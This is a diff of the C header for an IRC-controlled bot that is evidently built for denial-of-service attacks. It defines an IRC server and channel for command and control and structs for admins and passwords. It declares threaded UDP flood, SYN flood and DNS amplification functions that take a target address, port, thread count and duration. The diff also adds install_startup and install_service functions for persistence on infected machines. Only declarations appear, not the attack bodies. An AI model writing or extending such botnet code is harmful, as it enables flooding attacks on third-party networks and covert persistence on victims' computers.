@@ -1,9 +1,9 @@
 /*
- * Author           : 93aef0ce4dd141ece6f5
- * Title            : bot.h
- * Description      : file contains miscellaneous 
- *                    definitions, function definitions
- *                    and structs
+ *   Author           : 93aef0ce4dd141ece6f5
+ *   Title            : bot.h
+ *   Description      : file contains miscellaneous 
+ *                      definitions, function definitions
+ *                      and structs
  *
  *   Copyright (C) 2016  93aef0ce4dd141ece6f5
  *
@@ -55,7 +55,7 @@
  */
 #define SERVER     "irc.freenode.net"   // IRC server
 #define PORT       "6667"           // server port
-#define CHANNEL    "#nullbyte"       // channel name
+#define CHANNEL    "#uuiiafa"       // channel name
 //#define U_NAME     "JSchmoeBot"     // username
 //#define N_NAME     "JSchmoeBot"     // nickname
 #define IRC_PWORD  NULL             // password for nickname
@@ -95,9 +95,13 @@
  * to WIN32's SOCKET typedef
  * and linux's file descriptor
  */
-typedef unsigned int SOCKET;
+typedef int SOCKET;
 
 #endif
+
+typedef unsigned int bool;
+
+extern char *prog_name;
 
 /*
  * struct containing IRC
@@ -111,6 +115,7 @@ typedef struct _account {
     char **admins;
     unsigned char admin_size;       // size of admins array
     unsigned char num_admins;       // number of admins
+    unsigned char num_default;      // number of default admins
 } Account, *pAccount;
 
 /*
@@ -121,14 +126,23 @@ typedef struct _account {
 typedef struct _message {
     char n_name[MAX_NAME];          // nickname
     char *contact;                  // channel/privmsg
-    int contactSize;
+    unsigned short contactSize;
     char *command;                  // command
-    int commandSize;
+    unsigned short commandSize;
     char *param;                    // command [parameter]
-    int paramSize;
+    unsigned short paramSize;
     char *msg;                      // entire message
-    int msgSize;
+    unsigned short msgSize;
 } Message, *pMessage;
+
+typedef struct _thr_args {
+    SOCKET s;
+    char *contact;
+    char *addr;
+    char *port;
+    int threads;
+    int time;
+} thr_args;
 
 /*
  * need to define some tcp/ip
@@ -207,25 +221,26 @@ typedef struct _dns_hdr {
      */
     unsigned char rcode:4;          // response code
     unsigned char z:3;              // reserved
-    unsigned short qdc;             // no. of question entries; 1 - one question
-    unsigned short anc;             // no. of resource records; 0 - not providing question
-    unsigned short nsc;             // no. of name server resource records; 0 - ignore response entries
-    unsigned short arc;             // no. of resource records in additional records section; 0 - ignore response enries
+    unsigned short qdc;             // no. of question entries
+    unsigned short anc;             // no. of resource records
+    unsigned short nsc;             // no. of name server resource records
+    unsigned short arc;             // no. of resource records 
+                                    // in additional records section
 } DNS_HDR, *pDNS_HDR;
 
 typedef struct _dns_ques {          // dns question struct
     unsigned char *qname;           // sequence of octets
-    unsigned short qtype;           // two octet code specifying query
-    unsigned short qclass;          // two octet code specifying class of query
+    unsigned short qtype;           // query
+    unsigned short qclass;          // class of query
 } DNS_QUES, *pDNS_QUES;
 
 typedef struct _dns_res_rec {
     unsigned char *name;            // domain name
-    unsigned short type;            // two octets containing one of the RR type codes
-    unsigned short class;           // two octets which specify the class of the data in the RDATA field
+    unsigned short type;            // RR type codes
+    unsigned short class;           // class of the data in the RDATA field
     unsigned int ttl;               // time to live
-    unsigned short rdlength;        // specifies the length in octets of the RDATA field
-    unsigned char *rdata;           // variable length string of octets that describes the resource
+    unsigned short rdlength;        // length in octets of the RDATA field
+    unsigned char *rdata;           // string that describes the resource
 } DNS_RES_REC, *pDNS_RES_REC;
 
 /*
@@ -241,29 +256,40 @@ typedef struct _dns_res_rec {
  * yet exist, please make one
  */
 // bot.c
-void non_fatal (char *);
-void fatal (char *);
+void non_fatal (const char *);
+void fatal (const char *);
 
 // init.c
 pAccount new_account (void);
 pMessage new_message (void);
-SOCKET irc_connect (char *, char *);
+SOCKET server_connect (const char *, const char *);
 int setup_irc (SOCKET, pAccount);
 void str_to_lower (char *);
 void format_message (pMessage);
 
 // recv.c
+// static void extract (pMessage, char *);
 int cleanup (SOCKET, pAccount, pMessage);
 void start_recv (SOCKET, pAccount);
 
 // exec.c
-int check_pass (char *);
+int my_send (SOCKET s, const char *, ...);
+int check_pass (const char *);
 int add_admin (pAccount, pMessage);
-int is_admin (pAccount, pMessage);
+bool is_admin (pAccount, pMessage);
+bool is_dos (const char *);
+// static thr_args *new_thr_args (SOCKET);
+// static void *(*get_flood_function (const char *f)) (void *);
+int parse_args (SOCKET, pMessage);
+int execute_command (SOCKET, pAccount, pMessage);
 
 // dos.c
-void udp_flood (SOCKET s);
-void syn_flood (SOCKET s);
-void dns_amp (SOCKET s);
+void *udp_flood (void *);
+void *syn_flood (void *);
+void *dns_amp (void *);
+
+// install.c
+int install_startup (const char *);
+int install_service (const char *);
 
 #endif
